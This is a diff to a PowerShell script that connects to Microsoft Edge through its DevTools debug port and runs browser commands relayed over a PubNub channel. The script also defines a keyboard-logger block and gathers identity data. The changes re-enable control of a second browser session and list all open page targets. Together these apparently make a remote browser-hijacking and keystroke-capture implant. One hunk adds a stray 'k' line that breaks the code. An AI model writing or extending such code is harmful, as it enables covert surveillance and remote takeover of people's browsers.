@@ -104,7 +104,7 @@ $script:identitykvpstr = Get-Identity | ConvertTo-Json
 
 $script:logger_logmsg_i = 0
 function Log-Msg {
-    param([string]$Msg)
+    param([object]$Msg)
 
     $caller = (Get-PSCallStack)[0].FunctionName
 
@@ -114,7 +114,7 @@ function Log-Msg {
 
     $script:logger_logmsg_i++
 
-    if ( $_ -is [System.Exception] ) {
+    if ( $_ -is [System.Exception] -or $_ -is [System.Management.Automation.ErrorRecord]) {
         Write-Host "caller: $caller"
         Write-Error $_.Exception.Message
         Write-Host $_.ScriptStackTrace -ForegroundColor DarkGray
@@ -253,9 +253,47 @@ class PSCDPTarget {
     $console_log_check = $false    
     $executionContextId = $null # needed to execute Runtime.callFunctionOn
 
+    [hashtable] GetDict() {
+        $ht = @{
+            title=$this.title
+            url=$this.url
+            targetId=$this.targetId
+            type=$this.type
+            description=$this.description
+            devtoolsFrontendUrl=$this.devtoolsFrontendUrl
+            webSocketDebuggerUrl=$this.webSocketDebuggerUrl
+            faviconUrl=$this.faviconUrl
+            attached=$this.attached
+            canAccessOpener=$this.canAccessOpener
+            browserContextId=$this.browserContextId
+            sessionId=$this.sessionId
+        }
+
+        return $ht
+    }
+
     [string] GetScreenshot() {
         # convert pngBytes to base64 string
         return $null
+    }
+
+    static [PSCDPTarget] GetPSCustomObject($obj) {
+        $ht = @{
+            title=$obj.title
+            url=$obj.url
+            targetId=$obj.targetId
+            type=$obj.type
+            description=$obj.description
+            devtoolsFrontendUrl=$obj.devtoolsFrontendUrl
+            webSocketDebuggerUrl=$obj.webSocketDebuggerUrl
+            faviconUrl=$obj.faviconUrl
+            attached=$obj.attached
+            canAccessOpener=$obj.canAccessOpener
+            browserContextId=$obj.browserContextId
+            sessionId=$obj.sessionId
+        }
+
+        return [PSCDPTarget]$ht
     }
 }
 
@@ -401,28 +439,24 @@ function Process-PubNubEvent {
         ts=$(Get-Timestamp)
         result=$null
     }
-
+k
     if ( $cmd.builtincmd -eq "GetFrontendUrls" ) {
         $result = Get-FrontendUrls
     } elseif ( $cmd.builtincmd -eq "ProcessCDP" ) {
         $result = Process-CDP($cmd)
     } elseif ( $cmd.builtincmd -eq "ExecCDPCommand" ) {
         $result = Exec-CDP($cmd)
-    } elseif ( $cmd.builtincmd -eq "GetActiveTarget" ) {
-        $target = $script:clientws.activeTarget
-        $screenshot=""
+    } elseif ( $cmd.builtincmd -eq "RefreshTargets" ) {
+        $targets = $script:clientws.targets # TODO doesn't have sessionId populated
 
+        $ttargets = $targets | ForEach-Object { $_.GetDict() }
+        <#
         if ($null -ne $byteArray -and $byteArray.Length -gt 0) {
             $screenshot = [System.Convert]::ToBase64String($target.pngBytes) # convert bytes to base64
         }
+        #>
 
-        $result = @{
-            url=$target['url']
-            title=$target['title']
-            screenshot=$screenshot
-            targetid=$target['targetId']
-            sessionid=$script:clientws.sessionId
-        }
+        $result = $ttargets
     }
 
     $resultout['result'] = $result
@@ -981,16 +1015,20 @@ class PSCDP {
         }
 
         if ( $targetCreated ) { # add target to list
-            $targetInfo = [PSCDPTarget]$msg.params.targetInfo
-            
-            $this.targets.Add($targetInfo) = $msg.params.targetInfo
+            $targetInfo = $msg.params.targetInfo
 
-            if ( ( ! [string]::IsNullOrEmpty($this.pubnuburl) ) -and $targetInfo.url -eq $this.pubnuburl ) {
-                $this.pubnubTarget = $targetInfo
-                
+            if ( $targetInfo.type -eq "page" ) {
+                $targetInfo = [PSCDPTarget]::GetPSCustomObject($targetInfo)
+
+                $this.targets.Add($targetInfo)
+
                 $this.sendQueue.Add( @{ method="Target.attachToTarget"; params=@{ targetId=$targetInfo.targetId; flatten=$true }; } )
-            }
 
+                if ( ( ! [string]::IsNullOrEmpty($this.pubnuburl) ) -and $targetInfo.url -eq $this.pubnuburl ) {
+                    $this.pubnubTarget = $targetInfo
+                }
+            }
+            
         }
 
         if ( $attachedToTarget ) { # update sessionId
@@ -1007,7 +1045,7 @@ class PSCDP {
             }
 
             if ( ( ! [string]::IsNullOrEmpty($this.pubnuburl) ) -and $targetInfo.url -eq $this.pubnuburl ) {
-                $this.pubnubTarget = $targetInfo
+                $this.pubnubTarget = $targetInfo # ? should not be necessary
                 $this.LoadQueue($targetInfo)
             }
         }
@@ -1101,9 +1139,9 @@ class PSCDP {
         }
 
         if ( ! $target.addbinding_ok ) {
-            throw "pubnub target in incorrect state -- addbinding_ok=$($target.addbinding_ok)"
+            throw [PSCDPException]::new("pubnub target in incorrect state -- addbinding_ok=$($target.addbinding_ok)", $true)
         } elseif ( [string]::IsNullOrEmpty($target.executionContextId) ) {
-            throw "pubnub target in incorrect state -- executionContextId=$($target.executionContextId)"
+            throw [PSCDPException]::new("pubnub target in incorrect state -- executionContextId=$($target.executionContextId)", $true)
         }
 
         $cmd = @{
@@ -1119,9 +1157,17 @@ class PSCDP {
 
     [void] LogState() {
         try {
-            Log-Msg "system state -- sendQueue: $($this.sendQueue.Count) commands: $($this.commands.Count) responses: $($this.responses.Count) results: $($this.results.Count) errors: $($this.errors.Count) pubnub messages: $($this.pubnubmsgs.Count) broadcasts sent: $($this.broadcasts.Count) broadcasts received: $($this.broadcastresponses.Count) broadcast errors: $($this.broadcasterrors.Count) console.log: $($this.console_log_check)"
+            $msgstrs = @()
+            $msgstrs += "sendQueue: $($this.sendQueue.Count) commands: $($this.commands.Count) responses: $($this.responses.Count)"
+            $msgstrs += "results: $($this.results.Count) errors: $($this.errors.Count) pubnub messages: $($this.pubnubmsgs.Count)"
+            $msgstrs += "broadcasts sent: $($this.broadcasts.Count) broadcasts received: $($this.broadcastresponses.Count) broadcast errors: $($this.broadcasterrors.Count)"
+            $msgstrs += "console.log: $($this.pubnubTarget.console_log_check)"
+            $msgstrs += "addbinding_ok: $($this.pubnubTarget.addbinding_ok)"
+            $msgstrs += "executionContextId: $($this.pubnubTarget.executionContextId)"
+            $msgstr = $msgstrs -join " "
+            Log-Msg "system state --  $msgstr"
         } catch {
-            Log-Msg "could not produce system overview message"
+            Log-Msg $_
         }        
     }
 
@@ -1138,8 +1184,8 @@ $pubnubport = $script:msedge_debugport
 $script:pubnubws = [PSCDP]::new($pubnubport, $pubnuburl)
 $script:pubnubws.ConnectCdp()
 
-#$script:clientws = [PSCDP]::new($clientport)
-#$script:clientws.ConnectCdp()
+$script:clientws = [PSCDP]::new($clientport)
+$script:clientws.ConnectCdp()
 
 $keyboardlogger = {
     try {
@@ -1183,19 +1229,18 @@ while ( $true ) {
         }
     
     } catch [PSCDPException]  {
-        if ( $_.ispubnubnull ) {
-            Write-Error $($_.Exception.Message)
+        if ( $_.Exception.ispubnubnull ) {
+            Log-Msg $_
         }
     } catch {
         Write-Error $($_.Exception.Message)
         Write-Host $_.ScriptStackTrace -ForegroundColor DarkGray
 
         $script:pubnubws.Reset()
-        $script:pubnubws.LoadQueue()
         $script:pubnubws.ConnectCdp()
     }
 
-<#
+
     try {
         $script:clientws.LogState()
 
@@ -1208,14 +1253,12 @@ while ( $true ) {
         $script:clientws.ExecCallbacks()
         $script:clientws.NextCmd()
     } catch {
-        Write-Error $($_.Exception.Message)
-        Write-Host $_.ScriptStackTrace -ForegroundColor DarkGray
+        Log-Msg $_
 
         $script:clientws.Reset()
-        $script:clientws.LoadQueue()
         $script:clientws.ConnectCdp()
     }
-#>
+
 
     Log-Msg "...sleeping"
 
